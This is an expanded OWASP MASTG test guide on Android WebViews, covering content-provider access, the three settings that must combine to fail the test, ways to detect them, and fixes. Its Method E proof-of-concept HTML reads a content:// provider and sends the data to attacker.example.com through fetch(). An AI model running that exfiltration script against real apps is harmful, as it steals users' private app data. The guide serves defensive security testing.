# MASTG-TEST-0250 References to Content Provider Access in WebViews

| Attribute | Value |
|---|---|
| **Test ID** | MASTG-TEST-0250 |
| **Platform** | Android |
| **MASVS Category** | MASVS-PLATFORM (MASVS-PLATFORM-2: The app uses WebViews securely) |
| **Weakness** | MASWE-0034 — *WebViews Allow Access to Local Resources with Untrusted Content* |
| **Highlighted API** | `WebView`, `WebSettings`, `getSettings`, `ContentProvider`, `setAllowContentAccess`, `setAllowUniversalAccessFromFileURLs`, `setJavaScriptEnabled` |
| **Test Type** | Static, Code |
| **Profile** | L1, L2 |
| **Knowledge** | MASTG-KNOW-0018 (WebViews) |
| **Best Practice** | MASTG-BEST-0011 (Securely Load File Content in WebView), MASTG-BEST-0012 (Disable JavaScript in WebViews), MASTG-BEST-0013 (Disable Content Provider Access in WebViews), MASTG-BEST-0049 (Restrict and Validate Access to Exported Content Providers) |
| **Related Techniques** | MASTG-TECH-0013, MASTG-TECH-0014, MASTG-TECH-0117, MASTG-TECH-0150 |
| **Related Demo** | — (none) |
| **Official Rule** | `mastg-android-webview-allow-local-access.yml` (exists — with an interesting caveat: **the filename ≠ the rule's internal `id`**, see §3.2) — its coverage is detection-only, it **does not evaluate the combination of FAIL conditions** |
| **Related CWE** | CWE-200 (Exposure of Sensitive Information), CWE-668 (Exposure of Resource to Wrong Sphere) |

---

## 1. Explanation

### 1.1 Testing Objective

Quote from the official MASTG overview:

> *"This test checks for references to Content Provider access in WebViews, which is enabled by default and can be disabled using the `setAllowContentAccess` method in the `WebSettings` class. If improperly configured, this can introduce security risks such as unauthorized file access and data exfiltration."*

This test differs from most other WebView settings because **`setAllowContentAccess` always defaults to `true`, on every Android version**, without exception — a point the official documentation explicitly emphasizes:

> **Note 1:** *"We do not consider `minSdkVersion` since `setAllowContentAccess` defaults to `true` regardless of the Android version."*

This contrasts with other WebView settings such as `setAllowFileAccess`, whose default **does change** depending on API level (default `true` for API ≤29, changing to `false` from API 30/Android 11 onward — discussed in MASTG-KNOW-0018). Because `setAllowContentAccess` is never "automatically safe" on any Android version, **the complete absence of an explicit call to this method in the code is NOT an indication of safety** — on the contrary, it means the WebView inherits the default value of `true`, which permits access.

### 1.2 What Is Actually Exposed: Not Just the App's Own Content Providers

The official overview gives an important detail about the scope of access that gets opened up:

> *"The JavaScript code would have access to any content providers on the device, such as: declared by the app, **even if they are not exported**; declared by other apps, **only if they are exported**."*

The point *"even if they are not exported"* is the most critical thing to understand. The `android:exported="false"` attribute on a `<provider>` is usually considered a **strong guarantee** that the provider cannot be accessed by other processes/apps — but this guarantee **does not hold** in the context of the app's own WebView. Because JavaScript running inside the app's own WebView operates **within the app's own process context** (not as a separate external application), it can access every content provider declared by that app, **regardless of its exported status**. This means the combination of *"provider is not exported" + "WebView allows content access"* creates a gap that **will never be detected** by inspecting the manifest alone (e.g., solely via MASTG-BEST-0049) — both aspects (provider configuration **and** WebView configuration) must be checked together.

### 1.3 A Commonly Misunderstood Note: `android:grantUriPermissions` Is Not Relevant Here

The official overview explicitly dispels a common misconception:

> **Note 2:** *"The provider's `android:grantUriPermissions` attribute is irrelevant in this scenario as it does not affect the app itself accessing its own content providers. It allows other apps to temporarily access URIs from the provider."*

This matters because a less careful tester could wrongly conclude that the absence of `grantUriPermissions` means the app is safe — whereas this attribute purely governs **temporary access from other apps**, and has no effect whatsoever on the ability of JavaScript inside the app's own WebView to access content providers belonging to that same app.

### 1.4 Three Conditions That Must Be Met Simultaneously for a True FAIL

This is the most technical and crucial part of this test — unlike most other WebView tests that FAIL based on a single setting, this test requires **a combination of three conditions at once**:

> *"The test case fails if all the following applies: `setJavaScriptEnabled` is explicitly set to `true`. `setAllowContentAccess` is explicitly set to `true` or not used at all. `setAllowUniversalAccessFromFileURLs` method is explicitly set to `true`."*

Why must all three occur together? Because together they form the **complete exploitation chain** that makes this risk real:

1. **`setJavaScriptEnabled(true)`** — without JavaScript, there is no mechanism to **make a programmatic request** (`XMLHttpRequest`/`fetch`) to a `content://` URI at all.
2. **`setAllowContentAccess`** (`true` or default) — ensures the `content://` scheme can actually be accessed/resolved by the WebView.
3. **`setAllowUniversalAccessFromFileURLs(true)`** — this is the key that **relaxes the same-origin policy** that would otherwise prevent a `file://` page from accessing a different origin such as `content://`.

The official overview emphasizes this third point explicitly as the **most critical** one in the attack chain:

> **Note 3:** *"`allowUniversalAccessFromFileURLs` is critical in the attack since it relaxes the default restrictions, allowing pages loaded from `file://` to access content from any origin, including `content://` URIs."*

Per the official Chromium documentation quoted in MASTG-KNOW-0018: *"URLs starting with `file://` will have a scheme based origin, and can access other scheme based URLs over `XMLHttpRequest`. For instance, `file://foo` can make an `XMLHttpRequest` to `content://bar`, `http://example.com/`, and `https://www.google.com/`."* — this is what opens the exfiltration path: a `file://` page loaded by the WebView (whether legitimate or successfully compromised via XSS/injection) can use JavaScript to read the content of the app's `content://` provider and send it to an attacker's server via an ordinary `fetch()`/XHR call to an external HTTP domain.

**Diagnostic evidence when one of the conditions is not met**: the official overview gives a concrete example of the error message that appears in `logcat` when `allowUniversalAccessFromFileURLs` is **not** enabled — CORS will block the access:

```text
[INFO:CONSOLE(0)] "Access to XMLHttpRequest at 'content://org.owasp.mastestapp.provider/sensitive.txt'
from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported
for protocol schemes: http, data, chrome, https, chrome-untrusted.", source: file:/// (0)
```

This is valuable diagnostic evidence: if this log appears during dynamic testing, it **confirms** that CORS protection is still active (a PASS condition for this aspect), whereas if the `content://` request **succeeds** without this message, the full exploitation chain has been satisfied.

### 1.5 Not a Standalone Vulnerability — An Impact Multiplier for Other Attacks

The official overview explicitly clarifies the nature of this risk:

> *"The `setAllowContentAccess` method being set to `true` does not represent a security vulnerability by itself, but it can be used in combination with other vulnerabilities to escalate the impact of an attack."*

This is consistent with the explanation in MASTG-BEST-0012 (Disable JavaScript in WebViews) regarding JavaScript in WebViews in general:

> *"JavaScript does increase the attack surface of a WebView, but severe cases typically happen when it is combined with one or more of the following conditions: loading untrusted or weakly validated content, exposing JavaScript bridges, allowing permissive file or content access, or using unsafe URL loading."*

This means a finding of this setting **alone** (without an accompanying vulnerability such as a WebView loading untrusted content, an exported WebView activity that accepts arbitrary URLs via an Intent, or XSS on the loaded page) has a far more limited impact. However, **combined** with another vulnerability — particularly **an exported Activity that loads a WebView and accepts a URL from an external Intent without validation** — this risk turns into a complete **Local File Read (LFR) and data exfiltration exploitation chain** that can be triggered by another malicious app on the same device without requiring any user interaction at all.

### 1.6 Official Recommendation: Not Just Disabling the Flag, But an Architectural Shift

MASTG-BEST-0011 provides a more fundamental recommendation than simply turning off a flag:

> *"The recommended approach to load file content to a WebView securely is to use `WebViewClient` with `WebViewAssetLoader` to load assets from the app's assets or resources directory using `https://` URLs instead of insecure `file://` URLs."*

This is an architectural shift — instead of relying on the `file://` scheme (which is inherently prone to this class of problem) and managing WebSettings flags one at a time, `WebViewAssetLoader` loads assets through a virtual `https://` scheme that **completely avoids** this same-origin-policy relaxation issue rooted in `file://` from the start.

---

## 2. Tools Used for Testing

### 2.1 Required Tools (Core)

| Tool | Function |
|---|---|
| **jadx** | Decompiles DEX → Java for searching `WebSettings`/`setAllowContentAccess` patterns |
| **grep / ripgrep** | Searches for the patterns of all three APIs and their combinations |
| **semgrep** | Runs the official rule as a baseline detection |
| **apktool/jadx (manifest)** | Extracts the list of `<provider>` entries for MASTG-TECH-0150 |

### 2.2 Alternative & Supporting Tools

| Tool | Function |
|---|---|
| **CodeQL** | Traces whether all three FAIL conditions (§1.4) are actually satisfied **on the same WebView instance**, rather than merely appearing in the same file without any real correlation |
| **MobSF** | Sometimes flags risky WebView setting combinations in its Code Analysis report |
| **Frida** | Hooks `WebSettings.setJavaScriptEnabled`/`setAllowContentAccess`/`setAllowUniversalAccessFromFileURLs` to confirm the values actually applied at runtime (catching cases where values are built dynamically/conditionally) |
| **adb logcat** | Monitors CORS block messages (§1.4) as direct diagnostic evidence during dynamic testing |
| **Burp Suite/mitmproxy with a proxy on the WebView** | Observes successful `content://` requests exfiltrated via `fetch()` to an external server when an exploit PoC is run |

### 2.3 Environment Prerequisites

- **No device/root required** for the core static analysis.
- **A device/emulator is required** for dynamic confirmation (Frida/logcat) and the exploit PoC.
- **Identify all of the app's content providers first** (MASTG-TECH-0150) as a map of potentially exposed data — per the official instruction to assess "whether they handle sensitive data."

---

## 3. Testing Methodology

### 3.1 Official MASTG Steps

1. Use **MASTG-TECH-0013** to reverse engineer the application.
2. Use **MASTG-TECH-0014** to search for relevant APIs.
3. Use **MASTG-TECH-0117** to obtain the `AndroidManifest.xml`.
4. Use **MASTG-TECH-0150** to obtain the list of content providers declared in the manifest.

### 3.2 Method A — Official Semgrep Rule *(exists, but only detects location — does not evaluate the combination)*

```yaml
rules:
  - id: mastg-android-webview-settings
    severity: INFO
    languages:
      - java
    metadata:
      summary: This rule detects WebView settings related to local file access and JavaScript execution.
    message: "[MASVS-PLATFORM-2] Detected WebView settings."
    pattern-either:
      - pattern: $WEBVIEW.getSettings(...);
      - pattern: $SETTINGS.setJavaScriptEnabled($ARG);
      - pattern: $SETTINGS.setAllowContentAccess($ARG);
      - pattern: $SETTINGS.setAllowFileAccessFromFileURLs($ARG);
      - pattern: $SETTINGS.setAllowFileAccess($ARG);
      - pattern: $SETTINGS.setAllowUniversalAccessFromFileURLs($ARG);
```

```bash
jadx -d ./decompiled ./target-app.apk
semgrep --config https://raw.githubusercontent.com/OWASP/mastg/master/rules/mastg-android-webview-allow-local-access.yml ./decompiled/sources/
```

**Notes on this rule:**

1. **The filename differs from the internal `id`** — the file is named `mastg-android-webview-allow-local-access.yml`, but the `id` inside it is `mastg-android-webview-settings`. This naming mismatch is purely cosmetic, but could be confusing when cross-referencing scan results with future rule documentation.
2. **This rule purely detects where any of the six API patterns occur** (including a bare `getSettings()` call) — it **does not evaluate whether the three FAIL conditions (§1.4) are actually satisfied together** with the corresponding argument values. The `INFO` severity reflects its nature as an inventory tool rather than a final risk assessor.
3. **It does not validate argument values** — the rule matches `setJavaScriptEnabled(false)` just as it matches `setJavaScriptEnabled(true)`, so scan results **cannot be read directly as FAIL findings** without manually checking the argument value at each occurrence.

### 3.3 Method B — Custom Semgrep That Evaluates the Actual FAIL Condition Combination

```yaml
rules:
  - id: custom-webview-content-provider-exfil-chain
    languages: [java, kotlin]
    severity: ERROR
    message: "[MASVS-PLATFORM-2] Full combination found: JavaScript enabled + content access allowed + universal file access enabled — content provider exfiltration chain via WebView"
    patterns:
      - pattern-inside: |
          $SETTINGS.setJavaScriptEnabled(true);
          ...
      - pattern-inside: |
          $SETTINGS.setAllowUniversalAccessFromFileURLs(true);
          ...
      - pattern-not: $SETTINGS.setAllowContentAccess(false);
```

```bash
semgrep -c ./webview-content-exfil-rule.yml ./decompiled/sources/
```

### 3.4 Method C — Manual grep/ripgrep with Argument Value Verification

```bash
D=./decompiled/sources

# Extract the full context around each WebSettings instance for manual verification of argument values
rg -n -B2 -A10 'getSettings\(\)' $D | grep -A10 "setJavaScriptEnabled\|setAllowContentAccess\|setAllowUniversalAccessFromFileURLs"

# Look specifically for the absence of setAllowContentAccess (defaults to true, F1 §1.1)
rg -l 'setJavaScriptEnabled(true)' $D | xargs -I{} sh -c 'echo "=== {} ==="; grep -c "setAllowContentAccess" {}'
```

### 3.5 Method D — CodeQL (Correlation on the Same WebView Instance)

```ql
import java

class WebSettingsCall extends MethodAccess {
  WebSettingsCall() {
    this.getMethod().getDeclaringType().hasQualifiedName("android.webkit", "WebSettings")
  }
}

from MethodAccess jsCall, MethodAccess universalCall, Expr contentAccessArg
where
  jsCall.getMethod().hasName("setJavaScriptEnabled") and
  jsCall.getArgument(0).(BooleanLiteral).getBooleanValue() = true and
  universalCall.getMethod().hasName("setAllowUniversalAccessFromFileURLs") and
  universalCall.getArgument(0).(BooleanLiteral).getBooleanValue() = true and
  jsCall.getQualifier().toString() = universalCall.getQualifier().toString()
select jsCall, universalCall, "Combination of JavaScript + Universal Access found on the same WebSettings object"
```

### 3.6 Method E — Dynamic Verification (Confirming Real Exploitation)

```html
<!-- poc.html — loaded via file:// in the target WebView, simulating a compromised page -->
<script>
fetch("content://com.target.app.provider/sensitive_data")
    .then(response => response.text())
    .then(data => {
        // Exfiltrate to the attacker's server
        fetch("https://attacker.example.com/collect?data=" + encodeURIComponent(data));
    })
    .catch(err => console.error("Failed to access content provider: " + err));
</script>
```

```bash
adb logcat | grep -i "CORS\|content://\|CONSOLE"
```

If the `fetch()` request to `content://` **succeeds** (no CORS block message as quoted in §1.4 appears) and the data is actually sent to the external server, this is definitive confirmation that the full exploitation chain works.

### 3.7 Method F — Frida (Confirming Runtime Values, Including Dynamically-Built Ones)

```javascript
// hook-webview-settings.js
Java.perform(function () {
    var WebSettings = Java.use("android.webkit.WebSettings");
    ["setJavaScriptEnabled", "setAllowContentAccess", "setAllowUniversalAccessFromFileURLs"].forEach(function (method) {
        WebSettings[method].overload("boolean").implementation = function (value) {
            console.log("[*] WebSettings." + method + "(" + value + ")");
            return this[method](value);
        };
    });
});
```

```bash
frida -U -f com.target.app -l hook-webview-settings.js --no-pause
```

### 3.8 Method Comparison: Which One to Use When

| Method | Tool | Detects location? | Evaluates FAIL combination? | When to use |
|---|---|---|---|---|
| **A** | Official semgrep rule | ✅ | ❌ | Baseline location inventory |
| **B** | Custom semgrep | ✅ | ✅ (simple pattern) | CI/CD gate for risky combinations |
| **C** | Manual grep | ✅ | Manual (needs eyeball verification) | Detailed per-location verification |
| **D** | CodeQL | ✅ | ✅ (precise correlation on the same instance) | Large codebases with many WebView instances |
| **E** | Dynamic PoC | N/A | ✅ (definitive proof) | Final confirmation of real exploitation |
| **F** | Frida | ✅ (runtime) | Partial | Dynamically/conditionally built values |

**Minimum recommended combination:** **A/C (baseline + manual) → D (precise correlation via CodeQL) → E (dynamic PoC)** for a solid conclusion, plus cross-checking the content provider list (MASTG-TECH-0150) to assess the sensitivity of potentially exposed data.

---

### 3.9 Evaluation Criteria: Positive Case & Negative Case

**Official MASTG rule:**

> **Evaluation:** *"The test case fails if all the following applies: `setJavaScriptEnabled` is explicitly set to `true`. `setAllowContentAccess` is explicitly set to `true` or not used at all. `setAllowUniversalAccessFromFileURLs` method is explicitly set to `true`. You should use the list of content providers obtained in the observation step to verify if they handle sensitive data."*

---

#### ❌ FAIL / ISSUE — The check is declared FAILED when:

| No | Condition |
|---|---|
| F1 | All three official conditions (§1.4) are met simultaneously on the **same WebView instance**: `setJavaScriptEnabled(true)` + (`setAllowContentAccess(true)` or not called at all) + `setAllowUniversalAccessFromFileURLs(true)` |
| F2 | An identified content provider (MASTG-TECH-0150) is confirmed to handle **sensitive data** (credentials, PII, tokens) — increasing the real-world impact of the F1 combination |
| F3 | Dynamic verification (Method E) confirms that a `fetch()`/XHR call to `content://` **succeeds** without being blocked by CORS |
| F4 | The F1 combination is found in a WebView loaded from an **exported Activity** that accepts a URL from an external Intent without adequate validation — the most severe combination (§1.5) |

**Example evidence (illustrative — MASTG does not yet provide an official demo for this test):**

```java
// Found in com/example/target/ui/DocumentViewerActivity.java
WebView webView = findViewById(R.id.webview);
WebSettings settings = webView.getSettings();
settings.setJavaScriptEnabled(true);                        // line 24
settings.setAllowUniversalAccessFromFileURLs(true);          // line 25
// setAllowContentAccess is NOT called at all -> defaults to TRUE
webView.loadUrl("file:///android_asset/viewer.html");
```

```bash
$ rg -n 'setJavaScriptEnabled\(true\)|setAllowUniversalAccessFromFileURLs\(true\)|setAllowContentAccess' \
  ./decompiled/sources/com/example/target/ui/DocumentViewerActivity.java
24:settings.setJavaScriptEnabled(true);
25:settings.setAllowUniversalAccessFromFileURLs(true);
# setAllowContentAccess not found -> defaults to true (condition F1 satisfied)
```

Interpretation: all three official conditions are satisfied — **FAIL**. Next step: check the app's content provider list (MASTG-TECH-0150) to assess what data is potentially exposed via this chain.

---

#### ✅ PASS — The check is declared PASSED when:

| No | Condition |
|---|---|
| P1 | `setJavaScriptEnabled` is set to `false` or not used (safe default) on a WebView loading `file://` content |
| P2 | `setAllowContentAccess(false)` is explicitly set as recommended by MASTG-BEST-0013 |
| P3 | `setAllowUniversalAccessFromFileURLs` is set to `false` or not called (safe default since API 16+) |
| P4 | The app uses `WebViewAssetLoader` with the virtual `https://` scheme per MASTG-BEST-0011, fully avoiding `file://` |
| P5 | Dynamic verification (Method E) confirms that the `content://` request is blocked by CORS |

---

#### ⚠️ Important Notes on the Assessment

1. **Do not conclude FAIL from a single setting alone** — per §1.4, all three conditions must be satisfied **simultaneously** on the same WebView instance. The official semgrep rule (Method A) only inventories locations, not combinations — manual verification or Methods B/D must be performed before reporting a FAIL.

2. **The absence of `setAllowContentAccess` is not a sign of safety** — unlike most other WebView settings, its default is always `true` on every Android version (§1.1). The lack of an explicit call to this method in the code must be read as a **condition satisfied**, not ignored.

3. **Do not be misled by the provider's `exported` status or `grantUriPermissions`** — per §1.2 and §1.3, neither is relevant to preventing access from the app's own WebView.

4. **Always correlate with the content provider list and the sensitivity of its data** — the official clause explicitly requires this ("verify if they handle sensitive data"). A combination of the three FAIL conditions that only exposes a provider containing non-sensitive data (e.g., public image cache) has a much lower impact than one exposing credentials/tokens.

5. **The finding's severity increases drastically when combined with an exported Activity + URL loading without validation** — per §1.5, this is not a standalone vulnerability; correlate it with testing of exported Activities and WebView URL validation (MASTG-KNOW-0018, WebViewClient section).

6. **Make use of logcat diagnostic evidence (§1.4)** as a quick way to empirically confirm CORS protection status without needing to build a full exploit PoC.

7. **Severity is modulated as follows:**

   | Factor | Severity |
   |---|---|
   | Combination of 3 FAIL conditions + content provider with sensitive data + exported Activity without URL validation | **Critical** |
   | Combination of 3 FAIL conditions + content provider with sensitive data, no risky exported Activity | **High** |
   | Combination of 3 FAIL conditions, but content provider only contains non-sensitive data | **Low/Medium** |
   | Only some conditions are satisfied (e.g., JS enabled but universal access is not) | **Informational** — note as a potential risk should the configuration change in the future |

8. **Document:** the values of all three settings for every WebView instance, the complete list of content providers along with their data sensitivity classification, the status of the Activity loading the WebView (exported or not, URL validation), and the results of dynamic verification.

---

## 4. Recommendations

### 4.1 Disable Content Access If Not Needed

```kotlin
webView.settings.apply {
    allowContentAccess = false   // per MASTG-BEST-0013, must be explicit since the default is always true
}
```

### 4.2 Disable Universal Access from File URLs

```kotlin
webView.settings.apply {
    allowUniversalAccessFromFileURLs = false  // breaks the key exploitation chain (§1.4)
}
```

### 4.3 Migrate to WebViewAssetLoader (Architectural Solution, per MASTG-BEST-0011)

```kotlin
val assetLoader = WebViewAssetLoader.Builder()
    .addPathHandler("/assets/", WebViewAssetLoader.AssetsPathHandler(context))
    .build()

webView.webViewClient = object : WebViewClientCompat() {
    override fun shouldInterceptRequest(view: WebView, request: WebResourceRequest): WebResourceResponse? {
        return assetLoader.shouldInterceptRequest(request.url)
    }
}
webView.loadUrl("https://appassets.androidplatform.net/assets/viewer.html")
```

### 4.4 Strengthen Content Provider Configuration Independently

Per MASTG-BEST-0049, although this does not replace WebView mitigations, ensure that every content provider that does not need to be accessed externally has `android:exported="false"` explicitly set as an additional defense layer.

### 4.5 Integrate into CI/CD

```bash
#!/bin/bash
# ci-check-webview-content-exfil.sh
APK=$1
jadx -d /tmp/decompiled_check "$APK" 2>/dev/null
semgrep -c ./webview-content-exfil-rule.yml /tmp/decompiled_check/sources/ --json | jq '.results | length'
```

### 4.6 Remediation Checklist

- [ ] All WebView instances have been inventoried and all three settings checked together (not one at a time in isolation)
- [ ] `setAllowContentAccess(false)` is explicitly set on every WebView that does not need content provider access
- [ ] `setAllowUniversalAccessFromFileURLs(false)` is explicitly set or left at its safe default
- [ ] Migration to `WebViewAssetLoader` has been considered for WebViews loading local content
- [ ] The app's content providers have been audited for exported status and data sensitivity
- [ ] Activities loading WebViews have been checked for exported status and URL validation
- [ ] Dynamic verification (PoC/logcat) has been performed for confirmation
- [ ] **Re-verify:** re-run MASTG-TEST-0250 on the final release APK after remediation

---

## 5. References

### 5.1 OWASP MASTG / MASVS

- [MASTG-TEST-0250: References to Content Provider Access in WebViews](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0250/)
- [MASWE-0034: WebViews Allow Access to Local Resources with Untrusted Content](https://mas.owasp.org/MASWE/MASVS-PLATFORM/MASWE-0034/)
- [MASTG-KNOW-0018: WebViews](https://mas.owasp.org/MASTG/knowledge/android/MASVS-PLATFORM/MASTG-KNOW-0018/)
- [MASTG-BEST-0011: Securely Load File Content in a WebView](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0011/)
- [MASTG-BEST-0012: Disable JavaScript in WebViews](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0012/)
- [MASTG-BEST-0013: Disable Content Provider Access in WebViews](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0013/)
- [MASTG-BEST-0049: Restrict and Validate Access to Exported Content Providers](https://mas.owasp.org/MASTG/best-practices/MASTG-BEST-0049/)
- [Official rule: mastg-android-webview-allow-local-access.yml (GitHub)](https://github.com/OWASP/mastg/blob/master/rules/mastg-android-webview-allow-local-access.yml)

### 5.2 Official Android Documentation

- [Android Developers — `WebSettings#setAllowContentAccess`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowContentAccess(boolean))
- [Android Developers — `WebSettings#setAllowUniversalAccessFromFileURLs`](https://developer.android.com/reference/android/webkit/WebSettings#setAllowUniversalAccessFromFileURLs(boolean))
- [Android Developers — WebViews: Unsafe File Inclusion](https://developer.android.com/privacy-and-security/risks/webview-unsafe-file-inclusion)
- [Android Developers — Cross-App Scripting risks](https://developer.android.com/privacy-and-security/risks/cross-app-scripting)
- [Android Developers — `WebViewAssetLoader`](https://developer.android.com/reference/androidx/webkit/WebViewAssetLoader)
- [Chromium WebView Docs — CORS and WebView API](https://chromium.googlesource.com/chromium/src/+/HEAD/android_webview/docs/cors-and-webview-api.md)

### 5.3 Research and Real-World Cases

- [Medium — Exploiting Insecure Android WebView with setAllowUniversalAccessFromFileURLs](https://medium.com/@youssefhussein212103168/exploiting-insecure-android-webview-with-setallowuniversalaccessfromfileurls-c7f4f7a8db9c)
- [INTEGRITY Labs — Reviewing Android WebViews fileAccess Attack Vectors](https://labs.integrity.pt/articles/review-android-webviews-fileaccess-attack-vectors/index.html)
- [Google — Fixing a File-based XSS Vulnerability](https://support.google.com/faqs/answer/7668153?hl=en-GB)
- [Alesandro Ortiz — Universal XSS in Android WebView (CVE-2020-6506)](https://alesandroortiz.com/articles/uxss-android-webview-cve-2020-6506/)
- [HackTricks — WebView Attacks](https://hacktricks.wiki/en/mobile-pentesting/android-app-pentesting/webview-attacks.html)
- [Redfox Security — Exploiting Android WebView Vulnerabilities](https://redfoxsec.com/blog/exploiting-android-webview-vulnerabilities/)
- [CWE-200: Exposure of Sensitive Information to an Unauthorized Actor](https://cwe.mitre.org/data/definitions/200.html)
- [CWE-668: Exposure of Resource to Wrong Sphere](https://cwe.mitre.org/data/definitions/668.html)

### 5.4 Tool Documentation

- [Semgrep — Documentation](https://semgrep.dev/docs/)
- [CodeQL — Documentation](https://codeql.github.com/docs/)
- [jadx — Dex to Java decompiler](https://github.com/skylot/jadx)
- [Frida — Dynamic instrumentation toolkit](https://frida.re/docs/javascript-api/)
- [MobSF — Mobile Security Framework](https://github.com/MobSF/Mobile-Security-Framework-MobSF)

---

*This document was prepared based on OWASP MASTG (current release as of September 2026), official Android/Chromium documentation, and community security research on WebView exploitation. The most important nuance of this test: a FAIL condition requires a **combination of three settings at once** on the same WebView instance — the official semgrep rule only inventories locations without evaluating that combination, so manual verification or additional tooling (custom semgrep/CodeQL) must be performed before concluding a result.*
